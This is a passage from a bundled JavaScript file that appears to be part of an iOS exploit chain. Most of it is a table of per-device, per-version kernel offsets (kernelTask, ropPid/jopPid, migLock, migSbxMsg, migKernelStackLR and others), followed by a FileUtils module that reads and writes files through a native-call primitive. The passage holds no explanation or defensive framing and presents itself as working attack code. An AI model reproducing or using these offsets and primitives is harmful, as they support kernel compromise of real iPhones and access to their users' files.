0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x925770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9256d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x925720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f6230n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f6248n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa02678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9fa678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x382c218n,\n\t\t\t\t\tmigSbxMsg: 0x382c238n,\n\t\t\t\t\tmigKernelStackLR: 0x317d020n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x3848428n,\n\t\t\t\t\tmigSbxMsg: 0x3848448n,\n\t\t\t\t\tmigKernelStackLR: 0x31994a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa73d10n,\n\t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n\t\t\t\t\ttro: 0x398n,\n\t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x38543a8n,\n\t\t\t\t\tmigSbxMsg: 0x38543c8n,\n\t\t\t\t\tmigKernelStackLR: 0x31a27e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"6\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x92d318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x935770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9316d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x931720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa06230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa06248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa12678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa0a678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa77b18n,\n\t\t\t\t\tmigLock: 0x3898c18n,\n\t\t\t\t\tmigSbxMsg: 0x3898c38n,\n\t\t\t\t\tmigKernelStackLR: 0x31dff60n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa7fc00n,\n\t\t\t\t\tmigLock: 0x38b4e28n,\n\t\t\t\t\tmigSbxMsg: 0x38b4e48n,\n\t\t\t\t\tmigKernelStackLR: 0x31fc3e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa83d10n,\n\t\t\t\t\tmigLock: 0x38bcda8n,\n\t\t\t\t\tmigSbxMsg: 0x38bcdc8n,\n\t\t\t\t\tmigKernelStackLR: 0x3205560n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"7\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t\n\t\n\t\n\t\n\t\"iPhone15\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x914e00n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919238n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9215f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921640n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x91d640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9ee150n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2168n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67c18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x37863f8n,\n\t\t\t\t\tmigSbxMsg: 0x3786418n,\n\t\t\t\t\tmigKernelStackLR: 0x3131620n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fd00n,\n\t\t\t\t\tmigLock: 0x37a2788n,\n\t\t\t\t\tmigSbxMsg: 0x37a27a8n,\n\t\t\t\t\tmigKernelStackLR: 0x314dc24n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fe10n,\n  \t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n  \t\t\t\t\ttro: 0x398n,\n  \t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x37aa708n,\n\t\t\t\t\tmigSbxMsg: 0x37aa728n,\n\t\t\t\t\tmigKernelStackLR: 0x3152ee0n\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"4\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t\n\t\n\t\"iPhone16\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0x140n,\n\t\t\t\t\tropPid: 0x1b0n,\n\t\t\t\t\tjopPid: 0x1b8n,\n\t\t\t\t\tguardExcCode: 0x380n,\n\t\t\t\t\ttaskThreads: 0x3c0n,\n\t\t\t\t\ttro: 0x3d0n,\n\t\t\t\t\tast: 0x3f4n,\n\t\t\t\t\tmutexData: 0x400n,\n\t\t\t\t\tctid: 0x480n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x978ef0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x991eb0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\toptions: 0xc0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3c8n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x99a308n,\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x99a268n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x99a2b8n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x9962b8n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xaae870n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x490n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xaae888n,\n\t\t\t\t\ttaskThreads: 0x3d0n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xab6cb8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xab2cb8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xb23d28n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x498n,\n\t\t\t\t\tmigLock: 0x3c03ef0n,\n\t\t\t\t\tmigSbxMsg: 0x3c03f10n,\n\t\t\t\t\tmigKernelStackLR: 0x3582fe0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xb2be10n,\n\t\t\t\t\tmigLock: 0x3c181a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c181c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35993a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xb2ff20n,\n  \t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t\tmigLock: 0x3c241a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c241c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35a26a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\t\n\t\n\t\n\t\n\t\"iPhone17\": {\n\t\t\"*\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x4042dc0n,\n\t\t\t\t\tmigSbxMsg: 0x4042de0n,\n\t\t\t\t\tmigKernelStackLR: 0x3912aa0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x405eff8n,\n\t\t\t\t\tmigSbxMsg: 0x405f018n,\n\t\t\t\t\tmigKernelStackLR: 0x392be64n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1bf78n,\n  \t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n  \t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x4066f88n,\n\t\t\t\t\tmigSbxMsg: 0x4066fa8n,\n\t\t\t\t\tmigKernelStackLR: 0x39352e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x408acd0n,\n\t\t\t\t\tmigSbxMsg: 0x408acf0n,\n\t\t\t\t\tmigKernelStackLR: 0x396e4a0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x40a6f08n,\n\t\t\t\t\tmigSbxMsg: 0x40a6f28n,\n\t\t\t\t\tmigKernelStackLR: 0x3987924n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1ff78n,\n\t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n\t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x40b6e98n,\n\t\t\t\t\tmigSbxMsg: 0x40b6eb8n,\n\t\t\t\t\tmigKernelStackLR: 0x3998de0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n }),\n\n \"./src/libs/JSUtils/FileUtils.js\":\n\n ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n __webpack_require__.d(__webpack_exports__, {\n   \"default\": () => ( FileUtils)\n });\n\n\nconst TAG = \"FILE-UTILS\";\n\nconst O_RDONLY\t= 0x0000;\nconst O_WRONLY\t= 0x0001;\nconst O_RDWR\t= 0x0002;\nconst O_APPEND  = 0x0008;\nconst O_CREAT\t= 0x0200;\nconst O_TRUNC\t= 0x0400;\nconst O_EVTONLY\t= 0x8000;\n\nconst ERROR\t\t= -1;\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nconst SEEK_SET = 0;\n\nclass FileUtils {\n\n\n\tstatic open(path) {\n\t\tconst fd = Native.callSymbol(\"open\", path, O_RDONLY);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\t\treturn fd;\n\t}\n\n\tstatic close(fd) {\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n\n\tstatic read(fd, size=0) {\n\t\tif (!size || size > Native.memSize)\n\t\t\tsize = Native.memSize;\n\t\tconst len = Native.callSymbol(\"read\", fd, Native.mem, size);\n\t\tif (!len || len == ERROR)\n\t\t\treturn false;\n\t\tconst buff = Native.read(Native.mem, len);\n\t\treturn buff;\n\t}\n\n\tstatic readFile(path, seek=0, length=0) {\n\t\tconst fd = this.open(path);\n\t\tif (fd === false)\n\t\t\treturn null;\n\n\t\tlet data = new Uint8Array();\n\n\t\tif (seek)\n\t\t\tNative.callSymbol(\"lseek\", fd, seek, SEEK_SET);\n\n\t\tlet remaining = length;\n\n\t\twhile (true) {\n\t\t\tlet size = remaining ? remaining : Native.memSize;\n\t\t\tif (size > Native.memSize)\n\t\t\t\tsize = Native.memSize;\n\t\t\tconst buff = this.read(fd, size);\n\t\t\tif (buff === false)\n\t\t\t\tbreak;\n\t\t\tconst buff8 = new Uint8Array(buff);\n\t\t\tlet newData = new Uint8Array(data.length + buff8.length);\n\t\t\tnewData.set(data, 0);\n\t\t\tnewData.set(buff8, data.length);\n\t\t\tdata = newData;\n\n\t\t\tif (remaining) {\n\t\t\t\tremaining -= buff.byteLength;\n\t\t\t\tif (!remaining)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tthis.close(fd);\n\n\t\treturn data.buffer;\n\t}\n\n\tstatic writeFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_TRUNC);\n\t}\n\n\tstatic appendFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | 